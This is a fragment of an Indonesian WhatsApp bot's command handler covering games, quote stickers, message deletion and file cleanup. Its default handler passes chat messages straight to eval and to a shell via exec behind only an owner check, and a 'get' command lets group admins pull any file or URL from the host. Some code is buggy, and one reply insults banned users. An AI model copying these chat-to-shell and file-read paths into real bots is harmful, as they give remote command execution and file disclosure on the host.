if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) reply `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await qyuunee.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) qyuunee.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'qc': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await qyuunee.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            qyuunee.sendImageAsSticker(from, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
            }
            break

case  'qcstick':{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await qyuunee.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await qyuunee.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await qyuunee.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 

case 'del':
case 'delete':{
qyuunee.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break

case 'delsampah':
{
    if (!isCreator) return reply(mess.owner);
    reply(mess.wait)
    let directoryPath = ['./', './src']; // Ganti dengan path yang sesuai di dalam kontainer // Ganti dengan path yang sesuai di dalam kontainer
    fs.readdir(directoryPath, async function (err, files) {
        if (err) {
            return reply('Tidak dapat memindai direktori: ' + err);
        } 
        let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm"));
        var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`;
        if (filteredArray.length == 0) return reply(teks);
        for (let i = 0; i < filteredArray.length; i++) {
            let stats = fs.statSync(path.join(directoryPath, filteredArray[i]));
            let fileSizeInBytes = stats.size;
            // Convert the file size to KB or MB as needed
            let fileSize = (fileSizeInBytes / (1024 * 1024)).toFixed(2); // in MB with two decimal places
            teks += `${i+1}. ${filteredArray[i]} - ${fileSize} MB\n`;
        }
        reply(teks);
        await sleep(2000);
        reply("Menghapus file sampah...");
        await Promise.all(filteredArray.map(async function (file) {
            try {
                await fs.unlinkSync(path.join(directoryPath, file));
            } catch (err) {
                console.error(err);
            }
        }));
        await sleep(2000);
        reply("Berhasil menghapus semua sampah");
    });
}
break

case 'lumine':
let chattttkkkkk = db.data.chats[m.chat];
let argsssskkkkk = m.text.split(' ');
await LumineCommand(m, chattttkkkkk, argsssskkkkk);
break;
            
default:

/*
if (db.data.chats[chatId].lumine) {
let che = db.data.chats[chatId]
LumineCommand(m, che, ['koi']);
}*/

if (db.data.chats[m.chat].antibot) {
if (m.isGroup) return 
if (m.fromMe && m.isBaileys) return !0
  
 if (m.id.includes('BAE5')) return !0
  await qyuunee.reply(m.chat, "*[ BOT LAIN TERDETEKSI ]*", null);
await sleep(5000)
if (!isAdmins && !isBotAdmins) {
  await qyuunee.groupParticipantsUpdate(m.chat, [m.sender], "remove");  
}
}
   
if (budy.startsWith('=>')) {
if (!isCreator) return reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}

if (budy.startsWith('get')) {
if (!isAdmins && !isCreator) return reply(mess.admin)
try {
qyuunee.sendFile(m.chat, `${q}`, 'file', m)
} catch (err) {e = String(err)
reply(e)
}
}

if (budy.startsWith('text')) {
if (!isCreator) return reply(mess.owner)
try {
const d = await fetch(`${q}`);
      const u = await d.json();
      const V = u.search_results.characters.slice(0x0, 0x5);
      const L = V.map(U => ({
        'external_id': U.external_id,
        'participant_name': U.participant__name,
        'title': U.title
      }));
      reply(JSON.stringify(L, null, 0x2));
} catch (err) {e = String(err)
reply(e)
}
}

if (budy.startsWith('$')) {
if (!isCreator) return reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if ((m.mtype === 'groupInviteMessage' || m.text.startsWith('Undangan untuk bergabung') || m.text.startsWith('Invitation to join') || m.text.startsWith('Buka tautan ini')) && !m.isBaileys && !m.isGroup) {
await qyuunee.sendMessage(m.chat, {react: {text: `🤨`,key: m.key,}})
let teks = 'group apa itu'
reply(teks)
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
qyuunee.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
console.log(util.format(err))
}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
